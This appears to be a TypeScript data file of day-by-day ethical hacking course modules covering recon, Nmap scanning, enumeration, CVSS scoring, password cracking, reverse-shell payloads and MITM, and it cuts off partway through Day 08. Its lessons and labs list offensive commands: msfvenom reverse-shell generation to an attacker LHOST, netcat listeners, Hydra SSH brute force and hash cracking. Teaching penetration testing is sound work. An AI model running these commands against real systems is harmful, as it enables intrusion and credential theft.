import { ModuleData } from '../types';
import { ETHICAL_HACKING_ENRICHMENTS_MAP } from './ethicalHackingEnrichmentData';

const RAW_ETHICAL_HACKING_MODULES: ModuleData[] = [
  {
    id: 101,
    track: 'ethical-hacking',
    dayNumber: "DAY 01",
    title: "Intro to Ethical Hacking & Legal Frameworks",
    shortDesc: "Master the foundations of offensive security, hacker classifications, Rules of Engagement (RoE), and cybersecurity laws.",
    category: "Offensive Foundations",
    estimatedMinutes: 60,
    topics: [
      "White Hat, Black Hat, Grey Hat & Red Team Roles",
      "Rules of Engagement (RoE) & Scope of Work Agreements",
      "Legal Frameworks (Indian IT Act 66/66F, CFAA, GDPR)",
      "The 5 Phases of Penetration Testing",
      "Bug Bounty Programs & Safe Harbor Responsible Disclosure"
    ],
    notes: {
      quickRevision: [
        "Ethical Hacking is the authorized practice of bypassing system security to discover real-world vulnerabilities before threat actors do.",
        "Testing without a signed written authorization contract is a criminal offense under Section 43/66 of the Indian IT Act and US CFAA.",
        "The 5 core phases: Reconnaissance -> Scanning & Enumeration -> Gaining Access -> Maintaining Access -> Reporting & Remediation.",
        "Rules of Engagement (RoE) must explicitly define in-scope IP subnets, forbidden techniques, testing time windows, and emergency escalation paths.",
        "Responsible disclosure policies and bug bounty platforms (HackerOne, Bugcrowd) grant security researchers legal safe harbor protection."
      ],
      keyTerms: [
        { term: "Rules of Engagement (RoE)", definition: "A legally binding contract specifying the boundaries, scope, testing windows, and approved methods of a penetration test." },
        { term: "Red Team", definition: "An offensive security team that simulates multi-layered real-world adversary attack scenarios against an enterprise." },
        { term: "Indian IT Act Section 66F", definition: "Legislation that penalizes acts of cyber terrorism targeting critical national information infrastructure with life imprisonment." },
        { term: "Safe Harbor", definition: "Legal protection granted by an organization to ethical security researchers who test and disclose bugs in good faith according to published scope." }
      ],
      importantCommands: [
        { command: "whois target.com", usage: "Query public domain registry and administrative contact details", purpose: "Passive Reconnaissance" },
        { command: "openssl s_client -connect target.com:443", usage: "Inspect SSL/TLS certificate chain and cipher suites", purpose: "Crypto Audit" }
      ],
      interviewPoints: [
        "What is the single most important document a penetration tester must secure before running any tool? (Answer: A signed authorization letter / Rules of Engagement).",
        "Explain the difference between a Red Team assessment and a standard Vulnerability Assessment.",
        "Under what conditions does port scanning become illegal in various jurisdictions?"
      ],
      commonMistakes: [
        "Running port scanners or automated tools against production IP addresses without verifying the exact client-authorized CIDR scope.",
        "Confusing vulnerability scanning with penetration testing: scanning is automated discovery; pentesting actively exploits flaws to prove impact.",
        "Failing to establish a formal emergency communication protocol in case a test causes unintended server downtime."
      ]
    },
    assignment: {
      title: "Rules of Engagement (RoE) & Scope Drafting",
      type: "Governance & Contract Challenge",
      objective: "Draft an ironclad Rules of Engagement (RoE) contract for an authorized penetration test on a commercial e-commerce banking client.",
      difficulty: "EASY",
      estimatedTime: "25 mins",
      maxScore: 100,
      instructions: [
        "Scenario: FinSecure Bank has engaged your ethical hacking consultancy to test their web portal and payment gateway API.",
        "1. Define the authorized in-scope domains and explicitly exclude third-party payment processors.",
        "2. Specify prohibited attack vectors (e.g., DoS, physical intrusion, employee spear-phishing).",
        "3. Define the off-peak testing time window and name an emergency point of contact.",
        "4. Reference the applicable legal clauses under the Indian IT Act 2000/2008."
      ],
      expectedOutput: "A structured, formal RoE document specifying exact CIDR ranges, testing windows (01:00-05:00 IST), explicit exclusions (DDoS, physical, social engineering), and legal indemnification clauses.",
      evaluationCriteria: [
        "Comprehensive scope definition with explicit out-of-scope boundaries",
        "Clear prohibition of destructive denial-of-service techniques",
        "Correct citation of Indian IT Act and safe harbor guidelines"
      ],
      challengeSnippet: "ROE_DRAFT_REQ_#101: Target: FinSecure Bank. Production IP: 103.24.18.0/24. Third-Party Gateway: Razorpay/Stripe (OUT OF SCOPE). Testing window: Night shift only."
    }
  },
  {
    id: 102,
    track: 'ethical-hacking',
    dayNumber: "DAY 02",
    title: "Footprinting & Reconnaissance (OSINT)",
    shortDesc: "Master open-source intelligence gathering, Google Dorking, WHOIS data, Shodan IoT queries, and DNS enumeration.",
    category: "Reconnaissance",
    estimatedMinutes: 75,
    topics: [
      "Passive vs Active Reconnaissance Principles",
      "Advanced Google Hacking / Dorking Techniques",
      "DNS Record Analysis, MX, TXT, SPF & Zone Transfers",
      "Shodan, Censys & External Attack Surface Management",
      "TheHarvester, Sublist3r & OSINT Metadata Scraping"
    ],
    notes: {
      quickRevision: [
        "Reconnaissance accounts for 70-80% of an ethical hacker's time; comprehensive recon exposes attack vectors defenders forgot existed.",
        "Passive OSINT leaves zero traces in the target organization's firewall or SIEM logs because queries target public third-party repositories.",
        "Google Dorking utilizes advanced search engine operators (`filetype:`, `site:`, `inurl:`, `intitle:`) to unearth indexed secrets and config files.",
        "DNS AXFR zone transfers (`dig axfr`) must be disabled on public nameservers to avoid leaking full internal hostname architectures.",
        "Shodan crawls global IoT, cloud servers, and SCADA infrastructure, indexing open ports, web banners, and default credentials."
      ],
      keyTerms: [
        { term: "OSINT (Open Source Intelligence)", definition: "Intelligence collected from publicly available resources, including search engines, social media, and domain registries." },
        { term: "Google Dorking", definition: "Using advanced search syntax to filter search engine results for sensitive documents, exposed databases, and vulnerable scripts." },
        { term: "DNS Zone Transfer (AXFR)", definition: "A DNS protocol mechanism designed to replicate DNS databases between primary and secondary nameservers." },
        { term: "Passive Reconnaissance", definition: "Information gathering conducted without making any direct network connections to the target's servers." }
      ],
      importantCommands: [
        { command: "theHarvester -d target.com -b google,linkedin,bing", usage: "Gather corporate employee emails, subdomains, and hostnames", purpose: "Passive OSINT" },
        { command: "dig axfr @ns1.target.com target.com", usage: "Attempt unauthorized DNS zone transfer", purpose: "DNS Recon" },
        { command: "sublist3r -d target.com -t 10", usage: "Brute-force and query open OSINT engines for subdomains", purpose: "Subdomain Enumeration" }
      ],
      interviewPoints: [
        "Why is passive reconnaissance preferred over active reconnaissance in the early stages of a Red Team engagement?",
        "How do you identify hidden subdomains that are not listed on public DNS servers? (Answer: Certificate Transparency logs, crt.sh, sublist3r, brute-force with wordlists).",
        "Give 3 real-world examples of dangerous Google Dorks and explain how site owners can defend against them."
      ],
      commonMistakes: [
        "Using active tools (like Nmap or Gobuster) before exhausting passive intelligence sources, prematurely alerting the target's SOC.",
        "Ignoring historical data: tools like Wayback Machine and SecurityTrails often retain API keys and dev subdomains long after they were removed from the homepage.",
        "Failing to review robots.txt and sitemap.xml files which explicitly list sensitive administrative paths."
      ]
    },
    assignment: {
      title: "Passive OSINT & External Attack Surface Audit",
      type: "Intelligence Gathering Lab",
      objective: "Perform an exhaustive passive reconnaissance audit on a simulated corporate entity and produce an Attack Surface Dossier.",
      difficulty: "MEDIUM",
      estimatedTime: "30 mins",
      maxScore: 100,
      instructions: [
        "Target Organization: MegaCorp Logistics (simulated domain: `megacorp-logistics.internal`).",
        "1. Construct 4 advanced Google Dorks to locate exposed spreadsheets, `.env` files, login portals, and database backups.",
        "2. Formulate the exact `dig` command to test for DNS zone transfers against their primary and secondary nameservers.",
        "3. Search Shodan for exposed service banners running outdated OpenSSH or Apache versions on their public IP subnet.",
        "4. Document the discovered subdomains, mail exchange (MX) providers, and potential spear-phishing employee leads."
      ],
      expectedOutput: "A structured OSINT Dossier detailing: 4 Google Dorks, DNS zone transfer verification results, Shodan query parameters, list of 6 discovered subdomains, and 3 security hardening recommendations.",
      evaluationCriteria: [
        "Accuracy and precision of Google Dork operators (`filetype:`, `site:`, `inurl:`)",
        "Correct DNS syntax for zone transfer checks and PTR record queries",
        "Practical remediation steps (DNS restrictions, Google Search Console URL removal, robots.txt hardening)"
      ],
      challengeSnippet: "OSINT_QUERY_TARGET: Domain: megacorp-logistics.internal. Expected assets: VPN portal, customer tracking endpoint, dev Jenkins instance."
    }
  },
  {
    id: 103,
    track: 'ethical-hacking',
    dayNumber: "DAY 03",
    title: "Network Scanning & Host Discovery",
    shortDesc: "Master active network discovery, TCP flag mechanics, Nmap scanning flags, stealth techniques, and OS fingerprinting.",
    category: "Network Auditing",
    estimatedMinutes: 80,
    topics: [
      "TCP/IP Protocol Flags & Handshake Deep Dive",
      "Nmap TCP SYN Stealth Scan (-sS) vs TCP Connect (-sT)",
      "UDP Port Scanning (-sU) & ICMP Host Discovery (-PE, -sn)",
      "Service Version Detection (-sV) & OS Fingerprinting (-O)",
      "NSE (Nmap Scripting Engine) Vulnerability Probing (--script vuln)"
    ],
    notes: {
      quickRevision: [
        "Scanning is the bridge between reconnaissance and exploitation: it determines which systems are alive and which ports are listening.",
        "Nmap SYN Stealth scan (`-sS`) sends a SYN packet; if it receives SYN-ACK, the port is open; it immediately sends RST to close the half-open connection without completing the 3-way handshake.",
        "TCP Connect scan (`-sT`) completes the full 3-way handshake (`connect()` syscall) and is used when raw socket privileges are unavailable (non-root users).",
        "UDP scanning (`-sU`) is connectionless and relies on receiving ICMP Port Unreachable (Type 3, Code 3) to confirm a closed port, making it significantly slower.",
        "Nmap Scripting Engine (NSE) contains hundreds of Lua scripts categorized into `vuln`, `safe`, `auth`, `discovery`, and `exploit`."
      ],
      keyTerms: [
        { term: "SYN Stealth Scan (-sS)", definition: "An Nmap port scanning technique that sends SYN packets and resets connections with RST before completing the 3-way handshake." },
        { term: "Half-Open Connection", definition: "A TCP connection state where the initial SYN-ACK is acknowledged by the scanner with an RST packet rather than an ACK." },
        { term: "NSE (Nmap Scripting Engine)", definition: "A powerful framework allowing users to write and execute automated Lua scripts for network discovery and vulnerability exploitation." },
        { term: "OS Fingerprinting", definition: "Deducing an operating system by analyzing differences in TCP window sizes, IP TTL values, and packet flag behavior." }
      ],
      importantCommands: [
        { command: "nmap -sS -sV -O -p- 192.168.1.10", usage: "Comprehensive stealth scan of all 65,535 ports with service versions and OS detection", purpose: "Full Port Audit" },
        { command: "nmap -sn 192.168.1.0/24", usage: "Host discovery ping sweep without port scanning", purpose: "Subnet Discovery" },
        { command: "nmap --script vuln -p 80,443 192.168.1.50", usage: "Run automated vulnerability detection scripts against web ports", purpose: "Vulnerability Probing" }
      ],
      interviewPoints: [
        "Explain the exact packet exchange in an Nmap SYN Stealth Scan against an OPEN port, a CLOSED port, and a FILTERED port.",
        "Why does a UDP scan take much longer than a TCP scan? (Answer: ICMP rate-limiting implemented by operating systems like Linux and Windows).",
        "What is the difference between `-T3` (normal) and `-T4` (aggressive) timing in Nmap, and when would you use `-T2`?"
      ],
      commonMistakes: [
        "Scanning all 65,535 ports on an aggressive timing template (`-T5`) over a slow or fragile VPN connection, causing network packet loss and inaccurate results.",
        "Assuming that a port labeled FILTERED means it is closed: FILTERED means a firewall or packet filter dropped the probe without returning an RST or ICMP response.",
        "Running aggressive scripts against production SCADA or medical equipment that can crash upon receiving unexpected binary payloads."
      ]
    },
    assignment: {
      title: "Targeted Nmap Reconnaissance & Network Mapping",
      type: "Network Scanning Challenge",
      objective: "Execute an optimal multi-stage Nmap scan against a multi-service target machine and analyze the open attack surface.",
      difficulty: "MEDIUM",
      estimatedTime: "30 mins",
      maxScore: 100,
      instructions: [
        "Target IP: 10.10.10.45 (simulated corporate intranet server).",
        "1. Write the Nmap command to perform an initial fast top-100 port scan with `-T4`.",
        "2. Formulate the comprehensive follow-up command to inspect the discovered open ports (e.g. 21, 22, 80, 445, 3306) with service detection (`-sV`) and default NSE scripts (`-sC`).",
        "3. Interpret an Nmap output where port 445 reports `SMBv1: Enabled` and identify the high-risk vulnerability.",
        "4. Propose two firewall iptables rules to block unauthorized port scans from external IP subnets."
      ],
      expectedOutput: "A professional network scanning report listing the two-stage scanning commands, parsed port table (Port, State, Service, Version), risk assessment of open SMBv1, and iptables remediation rules.",
      evaluationCriteria: [
        "Correct usage of Nmap flags (`-sS`, `-sV`, `-sC`, `-p-`, `-T4`, `-oA`)",
        "Accurate identification of SMBv1 (EternalBlue risk)",
        "Valid syntax for defensive firewall rules"
      ],
      challengeSnippet: "NMAP_TARGET_SPEC: Host: 10.10.10.45. Discovered services: 21/tcp (vsftpd 2.3.4), 80/tcp (Apache 2.4.41), 445/tcp (Samba 4.3.11)."
    }
  },
  {
    id: 104,
    track: 'ethical-hacking',
    dayNumber: "DAY 04",
    title: "Enumeration & Service Fingerprinting",
    shortDesc: "Extract deep intelligence from open services: SMB shares, NetBIOS, SNMP MIB trees, SMTP VRFY checks, and LDAP structures.",
    category: "Enumeration",
    estimatedMinutes: 75,
    topics: [
      "The Transition from Scanning to Active Enumeration",
      "SMB & Windows Share Enumeration (enum4linux, smbmap)",
      "SNMP MIB Walking & Community String Auditing (snmpwalk)",
      "SMTP Mail Transfer Agent Enumeration (VRFY, EXPN, RCPT)",
      "NFS Network File System Share Mounting & RPC Probing"
    ],
    notes: {
      quickRevision: [
        "Enumeration establishes active two-way connections to services to extract specific host data, such as usernames, shares, and group policies.",
        "SMB (Server Message Block) on port 445 is a goldmine for penetration testers: misconfigured null sessions reveal valid Active Directory domain users.",
        "SNMP (Simple Network Management Protocol) default community strings (`public`, `private`) allow attackers to walk the Management Information Base (MIB) to extract running processes and routing tables.",
        "SMTP commands `VRFY` and `EXPN` allow verifying whether a specific user mailbox exists on a mail server without sending an actual email.",
        "NFS (Network File System) on port 2049 allows mounting remote directories (`showmount -e`); poorly configured exports (`no_root_squash`) enable instant privilege escalation."
      ],
      keyTerms: [
        { term: "Null Session", definition: "An unauthenticated SMB/NetBIOS connection made with an empty username and empty password to query public IPC$ shares." },
        { term: "SNMP MIB (Management Information Base)", definition: "A hierarchical virtual database of network device metrics and configuration properties queried using SNMP." },
        { term: "no_root_squash", definition: "An NFS export configuration that preserves the root UID (0) of remote clients, allowing arbitrary root file creation." },
        { term: "enum4linux", definition: "A tool used to enumerate Windows and Samba systems for domain users, share lists, and group memberships." }
      ],
      importantCommands: [
        { command: "enum4linux -a 192.168.1.50", usage: "Run all automated enumeration checks against Windows/Samba target", purpose: "SMB Enumeration" },
        { command: "snmpwalk -v2c -c public 192.168.1.50 hrSWRunName", usage: "Enumerate all running process names via SNMP MIB", purpose: "Process Enumeration" },
        { command: "showmount -e 192.168.1.50", usage: "List exportable NFS shares on target server", purpose: "NFS Discovery" }
      ],
      interviewPoints: [
        "What is an SMB Null Session and how do you protect a modern Windows Server against it?",
        "Explain what 'no_root_squash' in an NFS `/etc/exports` file does and why it is a critical security vulnerability.",
        "How would you enumerate valid email accounts from an SMTP server that has disabled `VRFY`? (Answer: Use `RCPT TO:` command and analyze server response codes)."
      ],
      commonMistakes: [
        "Failing to check for default SNMP community strings (`public`, `private`, `community`, `manager`).",
        "Overlooking RPC port 135/rpcclient which allows querying Windows Local Security Authority (LSA) policies.",
        "Forgetting to check write permissions on mounted NFS shares when hunting for privilege escalation vectors."
      ]
    },
    assignment: {
      title: "SMB & SNMP Security Enumeration Audit",
      type: "Service Exploitation Prep",
      objective: "Extract user accounts, shares, and system metrics from an internal corporate server and write remediation instructions.",
      difficulty: "MEDIUM",
      estimatedTime: "30 mins",
      maxScore: 100,
      instructions: [
        "Target Server: 10.10.10.82 running Samba and SNMP.",
        "1. Write the `enum4linux` command to enumerate users, password policy, and shares.",
        "2. Formulate the `snmpwalk` command to extract network interfaces using community string 'public'.",
        "3. Interpret an enumeration output showing a share named `Department_Backups` with read access to `Everyone`.",
        "4. Provide the exact Samba configuration parameters (`smb.conf`) to disable null sessions and restrict share permissions."
      ],
      expectedOutput: "A complete Enumeration Assessment Report listing commands, parsed user accounts table, identified high-risk backup share, and hardened `smb.conf` configuration snippet (`restrict anonymous = 2`).",
      evaluationCriteria: [
        "Correct syntax for enum4linux and snmpwalk commands",
        "Identification of sensitive credential risks on unauthenticated shares",
        "Accurate Samba hardening directives in `smb.conf`"
      ],
      challengeSnippet: "ENUM_TARGET_OUTPUT: IPC$ Null Session: SUCCESS. Users found: Administrator, j.smith, k.patel, backup_service. Share: //10.10.10.82/Backups (Read Allowed)."
    }
  },
  {
    id: 105,
    track: 'ethical-hacking',
    dayNumber: "DAY 05",
    title: "Vulnerability Assessment & CVE Analysis",
    shortDesc: "Identify software flaws, master the Common Vulnerabilities and Exposures (CVE) index, CVSS v3.1 scoring, and automated scanners.",
    category: "Vulnerability Management",
    estimatedMinutes: 70,
    topics: [
      "Vulnerability Assessment Life Cycle vs Penetration Testing",
      "The CVE, NVD, and Exploit Database Ecosystem",
      "CVSS v3.1 Metrics: Base, Temporal & Environmental Scores",
      "Automated Web Vulnerability Scanning with Nikto & OpenVAS",
      "Manual Flaw Verification & Eliminating False Positives"
    ],
    notes: {
      quickRevision: [
        "A Vulnerability Assessment systematically catalogues security weaknesses without exploiting them, whereas a penetration test actively exploits flaws to measure breach depth.",
        "Every recognized software vulnerability is assigned a unique CVE ID (e.g. CVE-2021-44228 for Log4Shell) indexed in the NIST National Vulnerability Database (NVD).",
        "CVSS v3.1 scores range from 0.0 to 10.0: Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), and Critical (9.0–10.0).",
        "CVSS Base Score metrics evaluate Attack Vector (AV: Network/Adjacent/Local/Physical), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), and Scope (S).",
        "Automated scanners inevitably produce false positives; ethical hackers must manually inspect code and headers to verify exploitability."
      ],
      keyTerms: [
        { term: "CVE (Common Vulnerabilities and Exposures)", definition: "A publicly known information security flaw identifier maintained by the MITRE Corporation." },
        { term: "CVSS (Common Vulnerability Scoring System)", definition: "An open industry standard for assessing the severity of computer system security vulnerabilities." },
        { term: "NVD (National Vulnerability Database)", definition: "The U.S. government repository of standards-based vulnerability management data." },
        { term: "False Positive", definition: "An alert indicating that a vulnerability exists when in reality it does not." }
      ],
      importantCommands: [
        { command: "nikto -h http://192.168.1.100 -C all", usage: "Run web server vulnerability scanner against target host", purpose: "Web Flaw Scan" },
        { command: "searchsploit apache 2.4.49", usage: "Search local Exploit-DB offline repository for matching exploits", purpose: "Exploit Discovery" }
      ],
      interviewPoints: [
        "Walk through the calculation of a CVSS v3.1 score for a remote code execution flaw with no authentication required.",
        "How do you prioritize remediation when an automated vulnerability scanner returns 2,000 findings across an enterprise fleet?",
        "What is the difference between a zero-day vulnerability and an unpatched known CVE?"
      ],
      commonMistakes: [
        "Relying solely on CVSS base scores without considering environmental context: an unauthenticated RCE on an isolated test network is lower risk than on a public payment server.",
        "Delivering raw vulnerability scanner PDF exports directly to executive clients without manual verification and executive context.",
        "Forgetting to check the Exploit-DB repository for publicly available weaponized exploits matching discovered version numbers."
      ]
    },
    assignment: {
      title: "CVSS v3.1 Scoring & Exploitability Analysis",
      type: "Risk Evaluation Challenge",
      objective: "Calculate the exact CVSS v3.1 score for a critical corporate vulnerability and draft an executive vulnerability mitigation advisory.",
      difficulty: "HARD",
      estimatedTime: "30 mins",
      maxScore: 100,
      instructions: [
        "Vulnerability: Apache Struts OGNL Remote Code Execution (similar to Equifax CVE-2017-5638).",
        "Attack characteristics: Accessible over public Internet (Network), low complexity (Low), zero credentials needed (None), no user interaction (None), changes scope (Changed), and grants full root server takeover (High Confidentiality, High Integrity, High Availability).",
        "1. Construct the complete CVSS v3.1 Vector String.",
        "2. Calculate the final Base Score (0.0 to 10.0) and determine the severity rating.",
        "3. Draft an emergency 3-point remediation advisory for the Chief Information Security Officer (CISO)."
      ],
      expectedOutput: "A formal Vulnerability Advisory document featuring the full CVSS vector (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`), final score of 10.0 (CRITICAL), root-cause analysis, and immediate remediation action plan.",
      evaluationCriteria: [
        "Accurate CVSS v3.1 vector string formatting and metric assignments",
        "Correct calculation of 10.0 Critical rating",
        "Actionable, corporate-grade remediation advice (WAF virtual patching, package upgrade, network isolation)"
      ],
      challengeSnippet: "VULN_DATA: Target component: Struts2 Rest Plugin. Vector: HTTP Content-Type header injection. Privilege: root. Exploit available: YES (Public Metasploit module)."
    }
  },
  {
    id: 106,
    track: 'ethical-hacking',
    dayNumber: "DAY 06",
    title: "System Hacking & Password Auditing",
    shortDesc: "Master password security, hash cracking, dictionary and brute force attacks with John the Ripper, Hashcat, and Hydra.",
    category: "System Hacking",
    estimatedMinutes: 80,
    topics: [
      "Authentication Mechanisms & Password Hashing Algorithms",
      "Linux `/etc/shadow` & Windows NTLM/SAM Database Architecture",
      "Online Password Guessing with Hydra & Medusa",
      "Offline Hash Cracking with John the Ripper & Hashcat",
      "Rule-Based Mutations & Rainbow Table Mechanics"
    ],
    notes: {
      quickRevision: [
        "Authentication relies on what you know (password), what you have (token/key), or what you are (biometrics).",
        "Modern Linux hashes are stored in `/etc/shadow` using SHA-512 (`$6$`) or Yescrypt (`$y$`), while Windows stores NTLM hashes in the SAM registry hive and Active Directory `ntds.dit`.",
        "Online cracking (Hydra) attacks live services across the network and is constrained by network latency and account lockout thresholds.",
        "Offline cracking (Hashcat, John) attacks stolen password hashes using maximum local GPU/CPU compute without any risk of account lockouts.",
        "Modern password security requires slow, memory-hard key derivation functions like Argon2id and bcrypt with high work factors."
      ],
      keyTerms: [
        { term: "NTLM Hash", definition: "A legacy cryptographic hash format used by Microsoft Windows to store passwords in the SAM hive and Active Directory." },
        { term: "John the Ripper", definition: "A fast, flexible offline password cracking utility capable of automatically detecting hundreds of hash formats." },
        { term: "Hashcat", definition: "The world's fastest GPU-accelerated rule-based password recovery and hash cracking engine." },
        { term: "Hydra", definition: "A parallelized network login brute-forcing tool supporting over 50 protocols including SSH, FTP, HTTP, and RDP." }
      ],
      importantCommands: [
        { command: "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt", usage: "Crack NTLM hashes (mode 1000) using dictionary attack with rockyou wordlist", purpose: "NTLM Cracking" },
        { command: "john --format=sha512crypt --wordlist=rockyou.txt shadow.txt", usage: "Crack Linux SHA-512 shadow password hashes", purpose: "Linux Shadow Crack" },
        { command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh", usage: "Perform online SSH login password brute force against admin user", purpose: "SSH Brute Force" }
      ],
      interviewPoints: [
        "Why is NTLM fundamentally insecure in modern enterprise networks, and how does Kerberos replace it?",
        "Explain how GPU architecture enables Hashcat to crack passwords thousands of times faster than traditional CPU cores.",
        "How do you design an account lockout policy that prevents online brute force while preventing Denial-of-Service attacks against legitimate users?"
      ],
      commonMistakes: [
        "Running online password attacks without checking account lockout thresholds, accidentally locking out every employee in the Active Directory domain.",
        "Using unmutated wordlists: modern enterprise passwords almost always use capital letters, numbers, and symbols that require rule-based mutations (`hashcat -r rules/best64.rule`).",
        "Treating base64 encoding as encryption: base64 is an encoding scheme, not an encryption or hashing algorithm."
      ]
    },
    assignment: {
      title: "Offline Hash Identification & Dictionary Cracking Lab",
      type: "Cryptanalysis Challenge",
      objective: "Identify unknown password hash algorithms and recover the plain-text passwords using John the Ripper and Hashcat.",
      difficulty: "HARD",
      estimatedTime: "35 mins",
      maxScore: 100,
      instructions: [
        "Given three extracted hash samples:",
        "Hash A: `e10adc3949ba59abbe56e057f20f883e`",
        "Hash B: `b4b9b02e6f09a9bd760f388b67351e2b` (Windows NTLM)",
        "Hash C: `$6$rounds=5000$saltsalt$X2p6Q...` (Linux SHA-512 crypt)",
        "1. Identify the hash algorithm for each sample using hash-identifier.",
        "2. Write the exact Hashcat command syntax and mode number for Hash B.",
        "3. Write the exact John the Ripper command syntax to crack Hash C using the `rockyou.txt` wordlist.",
        "4. Propose an enterprise password policy and algorithm migration plan to replace legacy MD5/NTLM with Argon2id."
      ],
      expectedOutput: "A complete Hash Cracking Lab Report identifying MD5, NTLM (mode 1000), and SHA-512crypt (mode 1800), displaying recovered plain-texts, and detailing an enterprise Argon2id upgrade policy.",
      evaluationCriteria: [
        "Accurate hash algorithm identification",
        "Correct Hashcat and John the Ripper syntax and mode parameters",
        "Comprehensive password policy (passphrases, MFA, breach dictionary monitoring)"
      ],
      challengeSnippet: "CRACK_TARGET: Sample Hash: 31d6cfe0d16ae931b73c59d7e0c089c0 (Empty password NTLM). Wordlist: rockyou.txt."
    }
  },
  {
    id: 107,
    track: 'ethical-hacking',
    dayNumber: "DAY 07",
    title: "Malware Threats & Payload Generation",
    shortDesc: "Understand malware taxonomy, reverse shells, Metasploit msfvenom payload generation, trojans, and evasion techniques.",
    category: "Offensive Tooling",
    estimatedMinutes: 80,
    topics: [
      "Malware Taxonomy: Trojans, Worms, Rootkits, Ransomware & Droppers",
      "Reverse Shells vs Bind Shells Architecture",
      "Metasploit Framework: Architecture, Auxiliary, Exploits & Payloads",
      "Msfvenom Custom Payload Crafting (ELF, EXE, PHP, ASPX)",
      "Basic Static and Dynamic Malware Triage on VirusTotal"
    ],
    notes: {
      quickRevision: [
        "Malware is software specifically designed to disrupt, damage, or gain unauthorized access to computer systems.",
        "A Reverse Shell forces the victim machine to initiate an outbound connection back to the attacker's listener, effortlessly bypassing restrictive ingress firewall rules.",
        "Msfvenom combines Metasploit's payload generation (`msfpayload`) with payload encoding (`msfencode`) to output binaries in various formats.",
        "Staged payloads send a tiny initial stager shellcode that downloads the rest of the payload into memory, whereas stageless payloads contain the full payload binary.",
        "Antivirus engines detect malware using signature matching (hashes, byte sequences), heuristic analysis, and behavioral sandbox execution."
      ],
      keyTerms: [
        { term: "Reverse Shell", definition: "A shell session initiated from the target system back to the attacker's listening machine, bypassing inbound firewall blocks." },
        { term: "Msfvenom", definition: "A command-line payload generator within the Metasploit Framework used to generate shellcode and standalone binaries." },
        { term: "Meterpreter", definition: "An advanced, dynamically extensible payload that executes entirely in memory using reflective DLL injection to evade disk forensics." },
        { term: "C2 (Command and Control)", definition: "Centralized servers operated by attackers or Red Teams to remotely control compromised endpoints." }
      ],
      importantCommands: [
        { command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf", usage: "Generate standalone 64-bit Linux reverse shell executable", purpose: "Payload Generation" },
        { command: "nc -lvnp 4444", usage: "Set up Netcat listener on port 4444 awaiting inbound reverse shell", purpose: "Reverse Shell Listener" },
        { command: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.10.14.2; set LPORT 4444; run'", usage: "Automate Metasploit multi-handler listener", purpose: "Listener Automation" }
      ],
      interviewPoints: [
        "Why do penetration testers prefer reverse shells over bind shells in modern enterprise environments?",
        "Explain how Meterpreter's in-memory execution avoids traditional antivirus file-scanning detection.",
        "What is the difference between an encoder (like Shikata Ga Nai) and a true crypter when attempting antivirus evasion?"
      ],
      commonMistakes: [
        "Generating a payload with a local non-routable IP address (`127.0.0.1`) instead of the reachable attacker listener IP (`LHOST`).",
        "Uploading custom penetration testing payloads directly to public VirusTotal during live client engagements, leaking client-specific artifacts to threat intelligence feeds.",
        "Failing to stage Netcat or multi-handler listeners before triggering payload execution on the victim host."
      ]
    },
    assignment: {
      title: "Reverse Shell Crafting & Multi-Handler Listener Lab",
      type: "Payload Engineering Lab",
      objective: "Generate a custom cross-platform reverse shell payload, configure the listener, and simulate command execution.",
      difficulty: "HARD",
      estimatedTime: "30 mins",
      maxScore: 100,
      instructions: [
        "Attacker IP: 10.10.14.20. Target: Linux Web Server (x64 architecture).",
        "1. Write the exact `msfvenom` command to craft a Linux x64 stageless reverse shell executable named `update_agent.elf` listening on port 9001.",
        "2. Formulate the Netcat command to establish a verbose listener on port 9001.",
        "3. Provide the Python command to upgrade the resulting raw `/bin/sh` shell into a fully interactive TTY bash shell.",
        "4. Detail 3 host-based security controls to detect and block unauthorized reverse shell execution."
      ],
      expectedOutput: "A comprehensive technical procedure covering msfvenom syntax, netcat listener setup, Python PTY spawn command (`python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`), and endpoint defenses (AppArmor/SELinux, EDR process tree auditing).",
      evaluationCriteria: [
        "Correct msfvenom parameters (`-p`, `LHOST`, `LPORT`, `-f elf`)",
        "Correct Python PTY spawn syntax",
        "Robust defensive recommendations (egress filtering, application whitelisting)"
      ],
      challengeSnippet: "PAYLOAD_SPEC: Architecture: x86_64 Linux. LHOST: 10.10.14.20. LPORT: 9001. Required format: ELF executable."
    }
  },
  {
    id: 108,
    track: 'ethical-hacking',
    dayNumber: "DAY 08",
    title: "Sniffing, MITM & Traffic Interception",
    shortDesc: "Capture network packets, execute ARP spoofing, analyze unencrypted protocols in Wireshark, and understand SSL/TLS stripping.",
    category: "Network Interception",
    estimatedMinutes: 75,
    topics: [
      "Network Sniffing Fundamentals: Promiscuous Mode vs Port Mirroring",
      "Address Resolution Protocol (ARP) & ARP Cache Poisoning Mechanics",
      "Wireshark Deep Packet Inspection & Credential Extraction",
      "Ettercap & Bettercap: Man-in-the-Middle Attack Execution",
      "SSL/TLS Stripping (SSLstrip) & HSTS Mitigation"
    ],
    notes: {
      quickRevision: [
        "Sniffing involves capturing and analyzing data packets traversing a network segment using tools like Wireshark or tcpdump.",
        "Switches isolate broadcast domains, preventing passive sniffing on adjacent ports; attackers execute ARP poisoning to force switches to route all subnet traffic through their machine.",
        "ARP has no authentication mechanism: devices unconditionally update their ARP cache tables upon receiving unsolicited ARP reply packets.",
        "SSLstrip downgrades secure HTTPS links to unencrypted HTTP by intercepting HTTP 302 redirects before the browser initiates a TLS handshake.",
        "HTTP Strict Transport Security (HSTS) with browser preloading prevents SSLstrip by forcing browsers to only connect via HTTPS regardless of user input."
      ],
      keyTerms: [
        { term: "ARP Poisoning (ARP Spoofing)", definition: "Sending falsified ARP reply messages across a LAN to link an attacker's MAC address with the IP of a legitimate default gateway." },
        { term: "Promiscuous Mode", definition: "A network interface card mode that passes all network traffic received on the physical wire to the operating system, regardless of destination MAC." },
        { term: "HSTS (HTTP Strict Transport Security)", definition: "A web security policy header informing browsers that the website must only be accessed over secure HTTPS connections." },
